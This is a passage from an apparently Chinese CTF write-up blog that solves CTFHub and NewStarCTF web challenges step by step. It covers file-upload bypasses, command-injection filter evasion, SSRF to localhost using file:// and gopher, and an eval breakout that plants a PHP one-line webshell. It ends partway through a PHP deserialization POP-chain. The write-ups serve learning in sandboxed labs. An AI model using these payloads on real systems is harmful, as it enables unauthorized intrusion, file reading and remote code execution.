class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>
<p>也就是下面这个请求头后面</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233456720.png" alt="image-20220731233456720"></p>
<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>
<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233716114.png"></p>
<p>用蚁剑连接<code>url/upload/1.php</code></p>
<p>得到<code>flag</code></p>
<h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165549883.png" alt="image-20220731165549883"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165841829.png" alt="image-20220731165841829"></p>
<p>得到flag</p>
<h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题</p>
<p>看到<code>|，;，&amp;</code>都被过滤了</p>
<p>那么可以用<code>%0a</code>也是换行符代替</p>
<p>空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>
<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>
<p><code>?ip=120.0.0.1%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215911504.png" alt="image-20220801215911504"></p>
<p>然后</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215930160.png" alt="image-20220801215930160"></p>
<p>后面就简单了</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
<p>右键查看源码</p>
<p>得到<code>flag</code></p>
<h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png" alt="image-20220802103603770"></p>
<p>所以构造payload</p>
<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
<p>得到flag</p>
<h2 id="13-SSRF-伪协议读取文件"><a href="#13-SSRF-伪协议读取文件" class="headerlink" title="13.SSRF-伪协议读取文件"></a>13.SSRF-伪协议读取文件</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>
<pre><code>    file:// — 访问本地文件系统

    http:// — 访问 HTTP(s) 网址

    ftp:// — 访问 FTP(s) URLs

    php:// — 访问各个输入/输出流(I/O streams)
</code></pre>
<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>
<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
<p>得到flag</p>
<h2 id="14-SSRF-端口扫描"><a href="#14-SSRF-端口扫描" class="headerlink" title="14.SSRF-端口扫描"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>
<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220802105640721.png" alt="image-20220802105640721"></p>
<p>看到长度不同，打开查看响应数据包</p>
<p>得到flag</p>
<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
<p>开始是一个空白页面</p>
<p>网站为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure>

<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=127.0.0.1/</span>flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925221703912.png" alt="image-20220925221703912"></p>
<p>发现出现了一个输入框</p>
<p><code>F12</code>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现了一个<code>key</code>的参数</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>是不定的哈，不要全<span class="built_in">copy</span></span><br></pre></td></tr></table></figure>

<p>我们把<code>key</code>值输入框中试试</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>看来只能从本地<code>127.0.0.1</code>访问</p>
<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure>

<p>右键查看，</p>
<p>得到<code>index.php</code>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>以相同方式看看<code>flag.php</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>根据<code>flag.php</code>最后的提示，</p>
<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Gopher协议的格式:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流</span><br></pre></td></tr></table></figure>

<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> 这个要和底下POST参数[包括<span class="keyword">key</span>=,4个]长度一致</span></span><br></pre></td></tr></table></figure>

<p>但是这里需要对其进行两次<code>url</code>编码</p>
<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
<p>因此需要两次<code>url</code>编码</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`注`：</span><br><span class="line">在第一次编码后的数据中，将`%<span class="number">0</span>A`全部替换为`%<span class="number">0</span>D%<span class="number">0</span>A`。</span><br><span class="line"></span><br><span class="line">因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，</span><br><span class="line">避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925231951671.png" alt="image-20220925231951671"></p>
<p>然后第二次编码</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925232013164.png" alt="image-20220925232013164"></p>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果直接在输入框，上传POST请求又会显示</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925232055769.png" alt="image-20220925232055769"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>线上靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>比赛题目wp&amp;感悟记录</title>
    <url>/2022/06/26/Game-wp/</url>
    <content><![CDATA[<p><code>以下是本人凑人数参加的各类比赛的题目做web题经历，在此记录学习过程，望大佬指点修正</code></p>
<span id="more"></span>

<h1 id="NewStarCTF公开赛"><a href="#NewStarCTF公开赛" class="headerlink" title="NewStarCTF公开赛"></a>NewStarCTF公开赛</h1><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>
<h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里绕过不细讲，都是常见的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>细讲这个</p>
<p>这个是一个<code>eval</code>函数，但是里面其实已经被<code>#</code>给注释掉了，</p>
<p>所以无论输入什么都没结果</p>
<hr>
<p>因此需要闭合或者绕过<code>#</code></p>
<p>但是我试了很多闭合方式，结果都没反应</p>
<p>最后发现</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>实现了语句闭合，</p>
<p>但是，当把这个php结尾符加到后面时候，这个php就就结束了</p>
<p>以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>为例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure>

<p>当我们闭合了php代码后，那后面的<code>haha</code>的位置在哪里呢</p>
<p><img src="/2022/06/26/Game-wp/image-20220921083750913.png" alt="image-20220921083750913"></p>
<p>我们可以看到，<code>haha</code>变成了<code>html</code>代码</p>
<p>那么就可以操作了，</p>
<p>比如xss，一句话🐎的插入等</p>
<p>xss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）</p>
<hr>
<p>插入一句话🐎</p>
<p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是用蚁剑连不上</p>
<p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>好家伙，传统思路，才是真</p>
<p>连接成功拿到<code>flag</code></p>
<hr>
<p>不知道有没有看到这篇文章的同学看到这个<code>wp</code>，提醒一下，这里需要在<code>http body</code>里补充<code>num</code>请求信息</p>
<p>因为这也是绕过的一个环节</p>
<p><img src="/2022/06/26/Game-wp/image-20220921084836402.png" alt="image-20220921084836402"></p>
<hr>
<h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2><p>一道<code>popchain</code>，这还是我第一次做<code>popchain</code>类【惭愧，不过做着真有意思】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造<code>pop</code>链主要在于，</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">把我们需要触发的魔术方法联系在一起，而且在联系触发过程中也要记得实例化目标类，这样才能调用和执行其中的方法</span><br></pre></td></tr></table></figure>



<p>我们先中每个类其中的魔术方法列出来看看，再分析一下</p>
<p><code>Start</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__destruct</span>(<span class="params"></span>)，对象被销毁时触发，也就是最后运行结束时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">      <span class="comment">//这里进行echo $this-&gt;name，如果$this-&gt;name是一个类就会调用Sec()类里__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__isset</span>(<span class="params"></span>)，当对不可访问属性调用<span class="title">isset</span>(<span class="params"></span>)或<span class="title">empty</span>(<span class="params"></span>)时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="comment">//这里把$this-&gt;func当作一个函数，执行$this-&gt;func()</span></span><br><span class="line">        <span class="comment">//如果$this-&gt;func不是一个正确的函数名，就会调用Sec类里__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Sec</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  //<span class="title">__toString</span>(<span class="params"></span>)，把类当做字符串时触发，</span></span><br><span class="line"><span class="function">  //所以在<span class="title">Start</span>类中的[<span class="title">echo</span> &quot;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">NewStarCTF</span>, &quot;.$<span class="title">this</span>-&gt;<span class="title">name</span></span>;]，就需要把name值赋值为Sec类名</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">       <span class="comment">//这里想调用this-&gt;obj的check方法</span></span><br><span class="line">        <span class="keyword">return</span> 